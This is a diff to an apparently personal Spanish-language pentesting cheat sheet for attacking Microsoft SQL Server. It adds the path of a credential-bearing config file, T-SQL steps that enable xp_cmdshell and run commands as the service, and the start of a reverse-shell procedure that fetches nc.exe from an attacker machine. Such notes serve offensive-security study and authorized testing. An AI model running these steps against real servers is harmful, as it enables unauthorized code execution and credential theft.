@@ -27,6 +27,13 @@ Tags: #MSSQL #SQLServer #Windows #DC #RCE #HashCapture #NTLMRelay #Impersonacion
 - [sqsh](https://sourceforge.net/projects/sqsh/)
 - [Hashcat](https://hashcat.net/hashcat/)
 
+```bash 
+# ARCHIVOS DENTRO DEL SERVER
+
+- C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI    
+# Archivo de configuración que contiene credenciales 
+```
+
 # DESDE FUERA DEL SERVIDOR (ACCESO REMOTO)
 
 ## 1. VERIFICAR SI MSSQL ESTÁ EXPUESTO Y ENUMERAR
@@ -105,6 +112,10 @@ Tags: #MSSQL #SQLServer #Windows #DC #RCE #HashCapture #NTLMRelay #Impersonacion
 # sqsh → alternativa cuando impacket falla
 ❯ sqsh -S ❮IP❯ -U 'user' -P 'passwd'
 # Los comandos en sqsh terminan con 'go' para ejecutarse
+
+# Insight:
+# [Pwn3d!] → sysadmin → xp_cmdshell directo
+# Sin [Pwn3d!] pero con acceso → enumerar y buscar impersonación
 ```
 
 ### OBTENER REVERSE SHELL (DESDE FUERA)
@@ -114,7 +125,35 @@ Tags: #MSSQL #SQLServer #Windows #DC #RCE #HashCapture #NTLMRelay #Impersonacion
 # [Pwn3d!] → sysadmin → xp_cmdshell directo
 # Requiere xp_cmdshell habilitado → ser sysadmin o impersonar SA
 
-# Paso 1 → Crear directorio temporal si no existe
+Paso 1:
+❯ SELECT IS_SRVROLEMEMBER('sysadmin')
+# 1 → soy sysadmin | 0 → no lo soy
+# Determina si puedo habilitar xp_cmdshell
+
+Paso 2:
+# Activarlo en caso de ser necesario 
+❯ EXEC sp_configure 'show advanced options', 1;
+❯ RECONFIGURE;
+
+❯ EXEC sp_configure 'xp_cmdshell', 1;
+❯ RECONFIGURE;
+# Activar xp_cmdshell 
+
+Paso 3:
+# comprobar si quedo habilitado 
+❯ EXEC sp_configure 'xp_cmdshell';
+# Se debería ver config_value y run_value en 1
+
+Paso 4:
+# Ejecutar comandos
+❯ EXEC xp_cmdshell 'whoami';
+❯ EXEC xp_cmdshell 'hostname';
+```
+
+```bash 
+# REVERSHELL
+Paso 1:
+# Crear directorio temporal si no existe
 ❯ xp_cmdshell "mkdir C:\temp"
 
 # Paso 2 → Descargar nc.exe desde Kali
